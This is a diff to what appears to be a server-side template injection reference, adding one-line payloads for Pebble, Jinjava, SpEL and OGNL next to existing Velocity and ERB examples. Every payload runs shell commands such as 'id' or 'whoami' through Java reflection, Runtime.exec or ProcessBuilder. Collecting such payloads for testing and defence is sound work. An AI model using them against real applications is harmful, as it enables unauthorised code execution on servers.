@@ -250,6 +250,14 @@ Common vulnerable patterns include:
   - `#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))`
   - `$ex.waitFor()`
   - `#set($out=$ex.getInputStream()) ... #foreach ... $str.valueOf($chr.toChars($out.read())) ... #end` (Read command output)
+- Pebble (Java, >=3.0.9 — reflect through `(1).TYPE` to reach `Runtime`, then decode the output stream back into a `String`):
+  - `{% set bytes=(1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec('id').inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}`
+- Jinjava (Java/HubSpot — pivot via `getClass().forName(...)` into a JS `ScriptEngine` that drives `ProcessBuilder`):
+  - `{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"id\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}`
+- SpEL (Java/Spring — Thymeleaf `${...}`, Spring expression sinks):
+  - `${T(java.lang.Runtime).getRuntime().exec('id')}`
+- OGNL (Java/Struts2, MyBatis):
+  - `(#rt=@java.lang.Runtime@getRuntime()).exec('id')`
 - Ruby (ERB, Slim):
   - `<%= system("whoami") %>`
   - `<%= Dir.entries('/') %>`
